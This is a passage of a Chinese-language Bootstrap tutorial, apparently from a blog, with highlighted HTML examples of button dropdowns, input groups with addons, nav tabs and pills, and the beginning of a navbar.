<li><strong>按钮下拉菜单的大小   <code>btn-lg</code>   <code>btn-sm</code>   <code>btn-xs</code></strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default btn-lg dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span>Default <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>html<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>javascript<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>jQuery<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>向上弹出式菜单    <code>dropup</code></strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group dropup"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default btn-lg dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span>Default <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>html<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>javascript<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>jQuery<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><strong>输入框</strong></p>
</li>
<li>
<p>基本的输入框组</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span>@<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>/&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span>.00<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span>$<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>/&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span>.00<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>输入框组的大小    <code>input-group-lg</code>  <code>input-group-xs</code>  <code>input-group-sm</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group input-group-lg"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span>@<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>复选框和单选框插件</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span><br><span class="line">	   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">		   <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span></span><br><span class="line">			   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>/&gt;</span></span><br><span class="line">		   <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">		   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>/&gt;</span></span><br><span class="line">	   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>按钮插件   <code>input-group-btn</code></strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-btn"</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>Go<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">type</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>按钮式下拉菜单</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group-btn"</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span>dropdown<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">				  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>资讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">				  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">				  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">type</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>分裂式按钮下拉菜单</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group-btn"</span>&gt;</span></span><br><span class="line">				  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>dropdown<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">				  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span></span><br><span class="line">					  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">				  <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">				  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">					  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>资讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">					  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">					  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">				  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">type</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line">		  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="七-导航-导航条-面包屑导航组件"><a class="markdownIt-Anchor" href="#七-导航-导航条-面包屑导航组件"></a> 七、导航、导航条、面包屑导航组件</h4>
<hr />
<p><strong>导航（标签） <code>nav</code></strong></p>
<ul>
<li>标签页   <code>nav-tabs</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav nav-tabs"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Project<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Message<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>胶囊式标签页 <code>nav-pills</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav nav-pills"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Project<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Message<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>垂直的胶囊式标签页  <code>nav-stacked</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav nav-pills nav-stacked"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Project<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Message<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>两端对齐的标签页 <code>nav-justified</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav nav-pills nav-justified"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Project<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Message<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>禁用链接  <code>disabled</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav nav-tabs"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"disabled"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Project<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Message<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>带有下拉菜单的标签</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav nav-tabs"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Project<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"dropdown"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span>Message <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>资讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>通讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>带下拉菜单的胶囊式标签</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav nav-pills"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Project<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"dropdown"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span>Message <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>资讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>通讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>导航条 <code>navbar</code>    <code>&lt;nav&gt;</code>标签中添加 <code>class</code> <code>.navbar</code>、<code>.navbar-default</code></strong></p>
<ul>
<li>默认的导航栏</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-default"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>poetries blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span 